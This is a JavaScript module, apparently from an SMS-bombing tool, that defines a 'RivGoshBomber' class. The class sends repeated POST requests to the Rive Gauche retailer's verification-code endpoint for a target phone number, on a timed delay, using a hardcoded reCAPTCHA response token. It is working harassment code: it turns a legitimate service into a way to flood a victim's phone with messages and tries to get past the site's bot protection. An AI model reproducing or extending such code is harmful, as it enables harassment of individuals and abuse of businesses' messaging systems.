const Bomber = require("../bomber");
const requestTypes = require("../../data-structures/requestTypes");

class RivGoshBomber extends Bomber {
    constructor(phone){
        super(phone);
        this.data = false;
    }
    headers = {
    }
    requestType = requestTypes.post;
    static country = "RU";
    siteName = "riv gosh";
    delay = 31000;
    url = `https://api.rivegauche.ru/rg/v1/newRG/customers/current/contacts/send-code?contact=${this.phone}&configGroupCode=default&countryCode=null&contactMustBeUnique=true&contactUserMustExist=false&g_recaptcha_response=03AGdBq26QXlfe9je6sEmwle1Cz1ALt9nGZvfhltTVn1PPF8lIwfnLJmkIh3bMVT8K5E1MyKmfXJ-OJXZKviTb9aQ64tBNtCkm9GUYYCMBh6VsMZrqvBOYCk_d59CrgmDgQo8yQLG0VbnouIhp6O-mCoegjr3JPYGGcbWTgXlENJj4neLVO4FGyfGfA3qq8YT_skAXUaTCejM4b3T13OTbNqYwMPVYXUFTFzjHz0d4moVWh9dE_i8MCSxGIo952lAOio42jQ7EUMES76v4WczySVXcD3-ZPcHibCSkvUPuWkjyYLW6AtQ4jBecuh8Sxn-FBxtWV7ykFMCbf7PPpfwXp7L99ldt38_tektzW_T-sQ8JHrVCK4EXloNxrtlITLGtk25KvmHFrvXOCu_5dYksXdgjeDFMjcascAwdw2nB8wx0Gwp7xsLOQiTC1bbKF-PVKPLqbw8GI37f`;  
}
module.exports = RivGoshBomber;